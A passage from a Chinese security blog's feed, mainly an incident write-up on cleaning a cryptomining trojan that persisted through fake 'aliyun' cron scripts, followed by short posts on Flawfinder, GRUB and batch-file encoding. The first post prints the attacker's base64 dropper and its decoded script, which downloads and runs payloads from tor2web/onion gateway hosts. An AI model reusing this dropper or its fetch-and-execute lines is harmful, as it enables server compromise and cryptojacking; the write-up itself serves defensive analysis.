    <content type="html"><![CDATA[<h2 id="一个名叫aliyun的挖矿木马处理过程"><a href="#一个名叫aliyun的挖矿木马处理过程" class="headerlink" title="一个名叫aliyun的挖矿木马处理过程"></a>一个名叫aliyun的挖矿木马处理过程</h2><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>老哥突然私聊我，他负责的服务器CPU飙高，发现可疑进程，疑似挖矿。<br><img src="/img/20191219-trojan-01.png" alt="20191219-trojan-01.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>为了防止事态进一步扩大，我让老哥先把这个进程kill掉，然后进行排查，可是没过多久，挖矿进程死灰复燃了，这次挖矿的名称变成了BP70vI<br><img src="/img/20191219-trojan-02.png" alt="20191219-trojan-02.png"><br>我想事情可能没那么简单，可能设置了定时任务或者有其他远控尚未发现。通过排查定时任务使用<code>crontab -l</code>，发现有一条定时任务，仔细一看原来是阿里云的shell脚本，但是整个系统就配置了这一条定时任务，难免让人怀疑。<br><img src="/img/20191219-trojan-03.png" alt="20191219-trojan-03.png"><br>当我打开<code>/root/.aliyun.sh</code>，我突然发现自己还是太年轻，攻击者尽然使用的是障眼法，没有那个运维人员会闲的蛋疼，把shell程序的内容使用base64进行编码。<br><img src="/img/20191219-trojan-04.png" alt="20191219-trojan-04.png"><br>以下是相关代码，有想研究的小伙伴可以拿去进行研究。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">exec</span> &amp;&gt;/dev/null<br><span class="hljs-built_in">echo</span> ZXhlYyAmPi9kZXYvbnVsbApleHBvcnQgUEFUSD0kUEFUSDovYmluOi9zYmluOi91c3IvYmluOi91c3Ivc2JpbjovdXNyL2xvY2FsL2JpbjovdXNyL2xvY2FsL3NiaW4KdD10cnVtcHM0YzRvaHh2cTdvCmRpcj0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmZvciBpIGluIC91c3IvYmluICRkaXIgL2Rldi9zaG0gL3RtcCAvdmFyL3RtcDtkbyB0b3VjaCAkaS9pICYmIGNkICRpICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp4KCkgewpmPS9pbnQKZD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCndnZXQgLXQxIC1UMTAgLXFVLSAtLW5vLWNoZWNrLWNlcnRpZmljYXRlICQxJGYgLU8kZCB8fCBjdXJsIC1tMTAgLWZzU0xrQS0gJDEkZiAtbyRkCmNobW9kICt4ICRkOyRkO3JtIC1mICRkCn0KdSgpIHsKeD0vY3JuCndnZXQgLXQxIC1UMTAgLXFVLSAtTy0gLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAkMSR4IHx8IGN1cmwgLW0xMCAtZnNTTGtBLSAkMSR4Cn0KZm9yIGggaW4gdG9yMndlYi5pbyA0dG9yLm1sIG9uaW9uLm1uIG9uaW9uLmluLm5ldCBvbmlvbi50byBkMndlYi5vcmcgY2l2aWNsaW5rLm5ldHdvcmsgb25pb24ud3Mgb25pb24ubnogb25pb24uZ2xhc3MgdG9yMndlYi5zdQpkbwppZiAhIGxzIC9wcm9jLyQoY2F0IC90bXAvLlgxMS11bml4LzAwKS9pbzsgdGhlbgp4IHRydW1wczRjNG9oeHZxN28uJGgKZWxzZQpicmVhawpmaQpkb25lCgppZiAhIGxzIC9wcm9jLyQoY2F0IC90bXAvLlgxMS11bml4LzAwKS9pbzsgdGhlbgooCnUgJHQudG9yMndlYi5pbyB8fAp1ICR0LjR0b3IubWwgfHwKdSAkdC5kMndlYi5vcmcgfHwKdSAkdC5vbmlvbi5tbiB8fAp1ICR0Lm9uaW9uLmluLm5ldCB8fAp1ICR0Lm9uaW9uLnRvIHx8CnUgJHQuY2l2aWNsaW5rLm5ldHdvcmsgfHwKdSAkdC5vbmlvbi5wZXQgfHwKdSAkdC50b3Iyd2ViLnN1IHx8CnUgJHQub25pb24uZ2xhc3MgfHwKdSAkdC5vbmlvbi53cwopfGJhc2gKZmkK|<span class="hljs-built_in">base64</span> -d | bash<br></code></pre></td></tr></table></figure><p>使用base64进行解码，可以得到恶意的shell脚本内容<br><img src="/img/20191219-trojan-05.png" alt="20191219-trojan-05.png"><br>解码以后的内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> &amp; &gt; /dev/null<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin<br>t=trumps4c4ohxvq7o<br><span class="hljs-built_in">dir</span>=$(grep x:$(<span class="hljs-built_in">id</span> -u): /etc/passwd|<span class="hljs-built_in">cut</span> -d: -f6)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> /usr/bin <span class="hljs-variable">$dir</span> /dev/shm /tmp /var/tmp;<br><span class="hljs-keyword">do</span><br><span class="hljs-built_in">touch</span> <span class="hljs-variable">$i</span>/i &amp;&amp; <span class="hljs-built_in">cd</span> <span class="hljs-variable">$i</span> &amp;&amp; <span class="hljs-built_in">rm</span> -f i &amp;&amp; <span class="hljs-built_in">break</span>;<br><span class="hljs-keyword">done</span><br><span class="hljs-function"><span class="hljs-title">x</span></span>() &#123;<br>f=/int<br>d=./$(<span class="hljs-built_in">date</span>|<span class="hljs-built_in">md5sum</span>|<span class="hljs-built_in">cut</span> -f1 -d-)<br>wget -t1 -T10 -qU- --no-check-certificate $1<span class="hljs-variable">$f</span> -O<span class="hljs-variable">$d</span> || curl -m10 -fsSLkA- $1<span class="hljs-variable">$f</span> -o<span class="hljs-variable">$d</span><br><span class="hljs-built_in">chmod</span> +x <span class="hljs-variable">$d</span>;<span class="hljs-variable">$d</span>;<span class="hljs-built_in">rm</span> -f <span class="hljs-variable">$d</span><br>&#125;<br><span class="hljs-function"><span class="hljs-title">u</span></span>() &#123;<br>x=/crn<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;wget -t1 -T10 -qU- -O- --no-check-certificate $1<span class="hljs-variable">$x</span> || curl -m10 -fsSLkA- $1<span class="hljs-variable">$x</span>&quot;</span><br>&#125;<br><span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> tor2web.io 4tor.ml onion.mn onion.in.net onion.to d2web.org civiclink.network onion.ws onion.nz onion.glass tor2web.su<br><span class="hljs-keyword">do</span><br><span class="hljs-keyword">if</span> ! <span class="hljs-built_in">ls</span> /proc/$(<span class="hljs-built_in">cat</span> /tmp/.X11-unix/00)/io; <span class="hljs-keyword">then</span><br>x trumps4c4ohxvq7o.<span class="hljs-variable">$h</span><br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">break</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span><br><br><span class="hljs-keyword">if</span> ! <span class="hljs-built_in">ls</span> /proc/$(<span class="hljs-built_in">cat</span> /tmp/.X11-unix/00)/io; <span class="hljs-keyword">then</span><br>(<br>u <span class="hljs-variable">$t</span>.tor2web.io ||<br>u <span class="hljs-variable">$t</span>.4tor.ml ||<br>u <span class="hljs-variable">$t</span>.d2web.org ||<br>u <span class="hljs-variable">$t</span>.onion.mn ||<br>u <span class="hljs-variable">$t</span>.onion.in.net ||<br>u <span class="hljs-variable">$t</span>.onion.to ||<br>u <span class="hljs-variable">$t</span>.civiclink.network ||<br>u <span class="hljs-variable">$t</span>.onion.pet ||<br>u <span class="hljs-variable">$t</span>.tor2web.su ||<br>u <span class="hljs-variable">$t</span>.onion.glass ||<br>u <span class="hljs-variable">$t</span>.onion.ws<br>)|bash<br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>通过分析，我们可以发现，该shell首先会判断当前用户是否对<code>/usr/bin 当前用户的home目录 /dev/shm /tmp /var/tmp</code>这几个目录拥有读写权限。</p><blockquote><p><strong>&#x2F;tmp&#x2F;.X11-unix&#x2F;00是什么鬼</strong><br>X11 server需要有一种途径来跟X11 client来进行沟通。 在网络上它们可以通过TCP&#x2F;IP Socket来实现沟通，而在本机上它们通过一个Unix-domain socket来沟通.Unix-domain socket其实很TCP&#x2F;IP socket很类似，只不过它指向的是一个文件路径，而且无需通过网卡进行转发，因此相对来说更安全，更更快些。而 &#x2F;tmp&#x2F;.X11-unix 其实就是存放这些Unix-domain Socket的地方。一般来说 &#x2F;tmp&#x2F;.X11-unix 下面只会有一个 Unix-domain Socket(因为一般只有一个Xserver在运行)，但若系统同时运行多个Xserver，也可能会有多个Unix Domain Socket出现的情况。具体可以参考参考内容里的文章，里面有详细说明</p></blockquote><p>但是，通过查看<code>/tmp/.X11-unix/</code>目录中的<strong>00</strong>文件，我并未发现该文件的种类并不是<strong>s</strong>，攻击者可能是为了掩人耳目，故意在该目录下设置一个文件，来存储远控木马进程id<br><img src="/img/20191219-trojan-06.png" alt="20191219-trojan-06.png"><br>通过判断 <strong>&#x2F;proc&#x2F;木马进程id&#x2F;io</strong> 文件是否存在，如果不存在执行<strong>X</strong>函数从以下这些站点三级域名<strong>trumps4c4ohxvq7o</strong>下载int木马客户端</p><ul><li>tor2web.io</li><li>4tor.ml</li><li>onion.mn</li><li>onion.in.net</li><li>onion.to</li><li>d2web.org</li><li>civiclink.network</li><li>onion.ws</li><li>onion.nz</li><li>onion.glass</li><li>tor2web.su</li></ul><p>通过全网检这些三级域名，发现年中的时候有人中招了，文件名不同，但是手法很像，有兴趣可以查看我提供参考链接。下载木马客户端的用户名为当前时间的md5值，然后授权执行删除。<br>具体使用wget或者curl请求下载int木马文件拼接案例语句如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget -t1 -T10 -qU- --no-check-certificate trumps4c4ohxvq7o.onion.mn/int -O./e0ee4ac14e82501dc127890f75770c17   || curl -m10 -fsSLkA- trumps4c4ohxvq7o.onion.mn/int -o./e0ee4ac14e82501dc127890f75770c17<br></code></pre></td></tr></table></figure><p>将下载下来的int和crn文件进行分析，<br>virustotal返回的结果是crn是安全的，int只有Ikarus和SentinelOne (Static ML)两个引擎判断为木马，可见这个木马病毒在绕过引擎检测方面下了大量功夫。<br>crn检测结果：<br><img src="/img/20191219-trojan-17.png" alt="20191219-trojan-17.png"><br>int检测结果：<br><img src="/img/20191219-trojan-18.png" alt="20191219-trojan-18.png"><br>返现int木马程序主体，crn为shell文件，目的是下载int木马程序并运行，crn文件并未进行编码和混淆，不太清楚作者为何这么做。<br><img src="/img/20191219-trojan-19.png" alt="20191219-trojan-19.png"><br>将int扔到IDA并未发现什么，只发现基本的逻辑流程，可能个人逆向功底太弱了，那位大佬分析了，可以请教一下。<br><img src="/img/20191219-trojan-20.png" alt="20191219-trojan-20.png"><br>接下来我们继续分析aliyun.sh脚本，发现木马通过判断 <strong>&#x2F;proc&#x2F;木马进程id&#x2F;io</strong> 文件是否存在，如果不存在执行<strong>U</strong>函数从以下这些站点三级域名<strong>trumps4c4ohxvq7o</strong>下载<strong>crn</strong> shell脚本并执行，<br>使用<code>lsof</code>命令查看该进程相关信息，如果没有相关命令，请自行安装<br><img src="/img/20191219-trojan-07.png" alt="20191219-trojan-07.png"><br>可以发现相应的远控客户端（&#x2F;usr&#x2F;bin&#x2F;46e5166a46208402e09732a78526b5f0）已删除<br>使用top我们可以发现，该挖矿木马的客户端的进程id为8391，<br><img src="/img/20191219-trojan-08.png" alt="20191219-trojan-08.png"><br>通过查看<code>/tmp/.X11-unix/00</code>文件，获取对应远控客户端进程id为<strong>8065</strong><br><img src="/img/20191219-trojan-09.png" alt="20191219-trojan-09.png"><br>通过pstree，我们可以清晰的看到两个异常的进程<strong>OYK6yV</strong>和 <strong>jKhnvF</strong><br><img src="/img/20191219-trojan-10.png" alt="20191219-trojan-10.png"><br>通过分析<code>ps -ef</code>的结果，获取异常异常进程信息<br><img src="/img/20191219-trojan-11.png" alt="20191219-trojan-11.png"><br>综合所有信息，我们发现jKhnvF是挖矿进程，OYK6yV是木马远控的进程。</p><h2 id="移除挖矿木马"><a href="#移除挖矿木马" class="headerlink" title="移除挖矿木马"></a>移除挖矿木马</h2><p>分析完挖矿木马基本信息，接下来我们需要移除这些恶意的进程，并针对相关漏洞进行打补丁。<br>我们首先移除了crotab中设定的定时任务<br><img src="/img/20191219-trojan-12.png" alt="20191219-trojan-12.png"><br>然后杀掉两个恶意进程<br><img src="/img/20191219-trojan-13.png" alt="20191219-trojan-13.png"><br>然后我发现当我们kill掉的挖矿进程又死灰复燃了，通过分析，可能其他地方还存在定时任务，或者遗漏，还有其他恶意进程，我们在 <strong>&#x2F;etc&#x2F;cron.d&#x2F;</strong> 下发现<strong>0aliyun</strong>这个定时任务文件，突然发现这里还有一个定时任务，顺便发现在 <strong>&#x2F;opt&#x2F;</strong> 目录下，还有一个 <strong>aliyun.sh</strong> 的挖矿脚本。<br><img src="/img/20191219-trojan-14.png" alt="20191219-trojan-14.png"><br>我们通过移除两个定时任务，然后重复上面的操作，找到挖矿端和木马远控客户端，杀掉就行<br><img src="/img/20191219-trojan-15.png" alt="20191219-trojan-15.png"><br>清除<code>/root/.aliyun.sh</code>和<code>/opt/aliyun.sh</code><br>看着运行正常的系统，内心还是很满足的。<br><img src="/img/20191219-trojan-16.png" alt="20191219-trojan-16.png"></p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>后续溯源工作由于系统是研发同事的测试系统，上面运行三个web站点，并且安装redis，memcache等，并且未设置日志，所以并未发现攻击者是从什么地方进来的。针对这些问题我们给出以下建议:<br>1、配置redis的日志，对redis进行安全加固和合规性配置<br>2、使用河马webshell查杀工具对web目录进行扫描，查看是否有遗留的webshell<br>3、加固操作系统，重新设置复杂度较高的密码。</p><h2 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h2><ul><li><a href="http://blog.lujun9972.win/blog/2018/04/24/docker%E5%AE%B9%E5%99%A8%E4%B8%AD%E8%B7%91gui%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E6%96%B9%E6%B3%95/index.html">http://blog.lujun9972.win/blog/2018/04/24/docker%E5%AE%B9%E5%99%A8%E4%B8%AD%E8%B7%91gui%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E6%96%B9%E6%B3%95/index.html</a>【&#x2F;tmp&#x2F;.X11-unix&#x3D;是什么玩意】</li><li><a href="https://unix.stackexchange.com/questions/196677/what-is-tmp-x11-unix">https://unix.stackexchange.com/questions/196677/what-is-tmp-x11-unix</a> 【what-is-tmp-x11-unix】</li><li><a href="https://www.cnblogs.com/jinanxiaolaohu/p/11993504.html">https://www.cnblogs.com/jinanxiaolaohu/p/11993504.html</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Trojan</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Flawfinder开源C/C++静态扫描分析工具安装与使用</title>
    <link href="/2019/11/15/2019-11-15-flawfinder-install-and-use/"/>
    <url>/2019/11/15/2019-11-15-flawfinder-install-and-use/</url>
    
    <content type="html"><![CDATA[<h2 id="Flawfinder开源C-x2F-C-静态扫描分析工具安装与使用"><a href="#Flawfinder开源C-x2F-C-静态扫描分析工具安装与使用" class="headerlink" title="Flawfinder开源C&#x2F;C++静态扫描分析工具安装与使用"></a>Flawfinder开源C&#x2F;C++静态扫描分析工具安装与使用</h2><h2 id="flawfinder的介绍"><a href="#flawfinder的介绍" class="headerlink" title="flawfinder的介绍"></a>flawfinder的介绍</h2><p>Flawfinder是一款开源的关于C&#x2F;C++静态扫描分析工具，其根据内部字典数据库进行静态搜索，匹配简单的缺陷与漏洞，flawfinder工具不需要编译C&#x2F;C++代码，可以直接进行扫描分析。简单快速，最大的有点就是免费，不需要编译。flawfinder工具可以在官网进行下载。<br><a href="https://dwheeler.com/flawfinder/#downloading">https://dwheeler.com/flawfinder/#downloading</a></p><h2 id="flawfinder的安装"><a href="#flawfinder的安装" class="headerlink" title="flawfinder的安装"></a>flawfinder的安装</h2><h3 id="在线安装"><a href="#在线安装" class="headerlink" title="在线安装"></a>在线安装</h3><p>flawfinder安装比较简单，由于其是基于Python实现的一款工具，所以需要首先安装Python环境，并配置环境变量。flawfinder下载之后解压既可使用。flawfinder目前之前python2和python3，简单的方法是使用pip工具，执行以下指令进行安装。</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> flawfinder<br></code></pre></td></tr></table></figure><h3 id="离线安装"><a href="#离线安装" class="headerlink" title="离线安装"></a>离线安装</h3><p>直接从flawfinder下载程序压缩包，解压完成以后，使用python直接加载flawfiner程序即可，或者直接下载flawfinder-*.whl，使用pip工具离线安装，这种通常是在一些甲方审计项目中出现，甲方客户无法协调审计设备上的管理员权限，又无法连接外网，只能使用一些免安装的工具。对于这种情况，python直接使用免安装版本，使用离线的方式使用pip安装或者使用python直接运行flawfinder,给各位审计人员一个建议，原理这些不靠谱的甲方企业。</p><h2 id="flawfinder的使用"><a href="#flawfinder的使用" class="headerlink" title="flawfinder的使用"></a>flawfinder的使用</h2><p>方式一：<code>flawfinder  --csv  &gt; test-result.csv   test.c</code><br>这种方式根据缺陷库生成一个 .csv文件  ，你只需要根据这个.csv文件就可以转换为正常Excel文件使用，转换方法自行百度。<br>方式二：<code>flawfinder  --html &gt; test-result.html test.c</code></p><h2 id="案例讲解"><a href="#案例讲解" class="headerlink" title="案例讲解"></a>案例讲解</h2><p>由于在日常审计过程中，项目中有其他格式的文件，通常使用linux<code>find</code>工具批量筛选.c或者.cpp文件，然后使用flawfinder进行扫描</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">cp <span class="hljs-params">--parents</span> `find 程序目录<span class="hljs-string">/-name</span> *<span class="hljs-string">.c</span>`  指定扫描目录<br></code></pre></td></tr></table></figure><ul><li>增加–parents目录主要作用是在拷贝的时候，会在目标路径中创建源文件参数中的所有父目录层级(不止是一层父目录)，然后将源文件拷贝进去。这样做的目的主要是清晰展示目录结构，方便写报告。</li></ul><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">flawfinder --<span class="hljs-built_in">csv</span> &gt; result.<span class="hljs-built_in">csv</span> 指定扫描目录<br></code></pre></td></tr></table></figure><p>导出csv文件内容展示如下<br><img src="/img/flawfinder-csv.png" alt="flawfinder-csv.png"></p><h2 id="flawfinder分析"><a href="#flawfinder分析" class="headerlink" title="flawfinder分析"></a>flawfinder分析</h2><p>Flawfinder 不是类似于fortify那样复杂的工具,它是一个简单并有意义工具。Flawfinder通过使用内置的C&#x2F;C++函数数据库来工作，该数据库具有众所周知的安全风险，例如缓冲区溢出风险（例如strcpy()，strcat()，gets()，sprintf()和scanf()），格式字符串问题（printf()，snprintf()和syslog()），竞争条件（例如access()，chown()，chgrp()，chmod()，tmpfile()，tmpnam()，tempnam()和mktemp()），潜在的远程命令执行风险（大多数exec()系列，system()，popen()）和较差的随机数获取方法（例如random()）。<br>Flawfinder的好处是不必创建相关数据库，自身就拥有相关数据库。Flawfinder获取源代码，并将源代码文本与这些名称匹配，同时忽略注释和字符串中的文本。Flawfinder还支持gettext（国际化程序的公共库），并且会将通过gettext传递的常量字符串当作常量字符串对待。这减少了国际化程序中的错误命中次数。<br>Flawfinder生成按风险分类的（潜在安全漏洞）列表；默认情况下，最危险的匹配项将首先显示。风险级别不仅取决于功能，还取决于功能的参数值。例如：在许多情况下，常量字符串通常比完全可变字符串的风险要小。在某些情况下，代码审计人员可能能够确定该结构体完全没有风险，从而减少了误报。与仅在源代码上运行“ grep”相比，Flawfinder提供了更好的信息和更好的优先级。flawfinder可以忽略注释和字符串内部，并且还将检查参数以估计风险水平。但是，从根本上来说，flawfinder仅仅是一个简单的python程序。它甚至不知道函数参数的数据类型，并且当然也不进行控制流或数据流分析。由于Flawfinder很简单，因此不会被宏定义和更复杂的工具遇到的其他奇怪问题所混淆。Flawfinder可以分析无法构建的软件；在某些情况下，它可以分析甚至无法在本地编译的文件。但是需要主要一点儿，并非发现的每个问题都是一个安全漏洞，也不一定能找到所有安全漏洞。如上所述，flawfinder不能真正理解代码的语义，它主要完成简单的文本模式匹配（忽略注释和字符串），不执行数据流或控制流分析，尽管如此，flawfinder在实际代码审计项目中也可以协助安全人员发现和消除安全漏洞。</p><h2 id="错误修复"><a href="#错误修复" class="headerlink" title="错误修复"></a>错误修复</h2><h3 id="UnicodeDecodeError-‘utf-8’-codec-can’t-decode-byte-0xff-in-position-0-invalid-start-byte"><a href="#UnicodeDecodeError-‘utf-8’-codec-can’t-decode-byte-0xff-in-position-0-invalid-start-byte" class="headerlink" title="UnicodeDecodeError: ‘utf-8’ codec can’t decode byte 0xff in position 0: invalid start byte"></a>UnicodeDecodeError: ‘utf-8’ codec can’t decode byte 0xff in position 0: invalid start byte</h3><p>在运行过程中，会出现解码出错，官方给出的建议是通过强制转换扫描文档的格式为utf-8，我们可以直接忽略<br><code>UnicodeDecodeError: &#39;utf-8&#39; codec can&#39;t decode byte 0xff in position 0: invalid start byte</code><br><img src="/img/flawfinder-error.png" alt="flawfinder-error.png"></p><h4 id="官方修复建议"><a href="#官方修复建议" class="headerlink" title="官方修复建议"></a>官方修复建议</h4><p><img src="/img/flawfinder-office-advice.png" alt="flawfinder-office-advice.png"><br>将操作系统的编码格式设置成<code>utf-8</code>，将程序编码格式强制转换为utf-8，官方推荐的工具为<code> cvt2utf</code>，可以根据实际情况自行修改。</p><h4 id="个人修复建议"><a href="#个人修复建议" class="headerlink" title="个人修复建议"></a>个人修复建议</h4><p><img src="/img/flawfinder-persional-advice1.png" alt="flawfinder-persional-advice1.png"><br>个人这个就有点儿暴力，直接在打开文件的那一步设定，如果出现错误直接忽略。flawfinder如果使用pip安装，安装的位置位于<code>/usr/local/bin/flawfinder</code>，其他安装方式，请根据实际情况进行查找。<br><img src="/img/flawfinder-persional-advice2.png" alt="flawfinder-persional-advice2.png"></p><h3 id="UnicodeDecodeError-‘ascii’-codec-can’t-decode-byte-0xe6-in-position-29-ordinal-not-in-range-128"><a href="#UnicodeDecodeError-‘ascii’-codec-can’t-decode-byte-0xe6-in-position-29-ordinal-not-in-range-128" class="headerlink" title="UnicodeDecodeError: ‘ascii’ codec can’t decode byte 0xe6 in position 29: ordinal not in range(128)"></a>UnicodeDecodeError: ‘ascii’ codec can’t decode byte 0xe6 in position 29: ordinal not in range(128)</h3><h4 id="错误原因"><a href="#错误原因" class="headerlink" title="错误原因"></a>错误原因</h4><p>提示中的“ordinal not in range(128)”，意思是，字符不在128范围内，即说明不是普通的ASCII字符，超出处理能力了。</p><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>找到flawfinder程序文件，用文本编辑器打开，在文件抬头加入以下代码。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import sys<br><span class="hljs-function"><span class="hljs-title">reload</span><span class="hljs-params">(sys)</span></span><br>sys<span class="hljs-selector-class">.setdefaultencoding</span>(<span class="hljs-string">&quot;utf-8&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://dwheeler.com/flawfinder/">https://dwheeler.com/flawfinder/</a>【flawfinder官网】</li><li><a href="https://github.com/david-a-wheeler/flawfinder">https://github.com/david-a-wheeler/flawfinder</a>【github】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>Code Audit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Flawfinder</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>grub vs grub2 bootloader</title>
    <link href="/2019/11/12/2019-11-12-grub-vs-grub2-bootloader/"/>
    <url>/2019/11/12/2019-11-12-grub-vs-grub2-bootloader/</url>
    
    <content type="html"><![CDATA[<h2 id="grub和grub2对比"><a href="#grub和grub2对比" class="headerlink" title="grub和grub2对比"></a>grub和grub2对比</h2><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在本文中，我提供了一些对Linux引导加载程序GRUB（统一引导加载程序）的一些了解。如果您了解GRUB的工作模式，那么这篇文章可以帮助您更好的了解操作系统。如果您对在Linux上工作充满信心，那么您应该掌握GRUB引导加载程序。GRUB可以轻松地与DOS，Windows，Linux或任何BSD操作系统一起使用。</p><p>Grub引导加载程序可以动态配置，这意味着用户可以选择在引导时进行更改。甚至用户也可以轻松地更改当前的引导条目，他们可以添加新条目，选择多个内核，甚至可以修改initrd。GRUB还获得了逻辑块地址的支持。GRUB可以从任何类型的设备（例如硬盘，CD和USB）安装和执行</p><h1 id="GRUB和GRUB2是两个不同的版本。"><a href="#GRUB和GRUB2是两个不同的版本。" class="headerlink" title="GRUB和GRUB2是两个不同的版本。"></a>GRUB和GRUB2是两个不同的版本。</h1><p>GRUB2被视为Ubuntu的默认引导加载程序，而GRUB通常用于RHEL较旧的版本中。启动时，GRUB2主要显示一个菜单并等待用户的一些输入。它通常将控制权转移到我们的操作系统内核。GRUB2的主要设计目的是为当今的操作系统提供灵活性和性能。</p><h1 id="GRUB和GRUB2"><a href="#GRUB和GRUB2" class="headerlink" title="GRUB和GRUB2"></a>GRUB和GRUB2</h1><p>GRUB2的默认菜单看起来与GRUB非常相似，但是其中进行了一些更改。以下是个人总结的一些异同点,仅供参考:</p><ul><li>Grub有两个配置文件，即menu.lst和grub.conf，而Grub2只有一个主要配置文件，即grub.cfg，它看起来非常接近完整的脚本语言。每当添加或删除内核或用户运行update-grub时，此配置文件都会被某些Grub 2软件包更新所覆盖。对于任何配置更改，我们都需要运行update-grub来使更改生效。</li><li>在Grub1中，普通用户确实很难修改配置。但是Grub2更加用户友好，Grub-mkconfig将自动更改配置。</li><li>在grub1分区号从0开始，而在Grub2中，分区号从1开始。第一个设备仍用hd0标识。如果需要，可以通过对&#x2F; etc &#x2F; grub文件夹的device.map文件进行一些更改来更改这些更改。</li><li>Grub1使用物理和逻辑地址来寻址磁盘，甚至无法从新的分区读取它，而Grub2使用UUID来标识磁盘，因此更加可靠。它支持LVM和RAID设备。</li><li>在包括（Ubuntu 和RHEL ）的当今Linux发行版中，GRUB2现在将直接显示登录提示，并且现在不显示菜单。</li><li>如果要在引导过程中查看菜单，则需要按住SHIFT键。即使有时按ESC也可以显示菜单。</li><li>用户现在还可以选择创建自定义文件，在其中可以放置自己的菜单项。可以使用&#x2F;etc&#x2F;grub.d文件夹中的40_custom文件进行配置。</li><li>现在，用户甚至也可以更改菜单显示设置。这是通过修改&#x2F; etc &#x2F; default文件夹下的grub文件实现的。</li></ul><hr><p>参考：<a href="https://zh.wikipedia.org/wiki/GNU_GRUB">https://zh.wikipedia.org/wiki/GNU_GRUB</a></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>Security</category>
      
      <category>OS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Grub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>批处理bat echo中文乱码解决方法</title>
    <link href="/2019/09/27/2019-09-27-change-bat-echo-garble/"/>
    <url>/2019/09/27/2019-09-27-change-bat-echo-garble/</url>
    
    <content type="html"><![CDATA[<h2 id="批处理bat-echo中文乱码解决方法"><a href="#批处理bat-echo中文乱码解决方法" class="headerlink" title="批处理bat echo中文乱码解决方法"></a>批处理bat echo中文乱码解决方法</h2><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>运行批处理bat文件，中文输出乱码，网上找到的解决方案，通过指定输出编码来解决：<code>chcp 65001</code><br>以下是测试用例</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dos">@<span class="hljs-built_in">echo</span> off<br><span class="hljs-comment">REM 声明采用UTF-8编码</span><br><span class="hljs-built_in">chcp</span> <span class="hljs-number">65001</span><br><span class="hljs-built_in">echo</span> test<br><span class="hljs-built_in">echo</span> 中文测试<br><span class="hljs-built_in">pause</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Note</tag>
      
      <tag>Bat</tag>
      
    </tags>
    
  </entry>
  
  
  
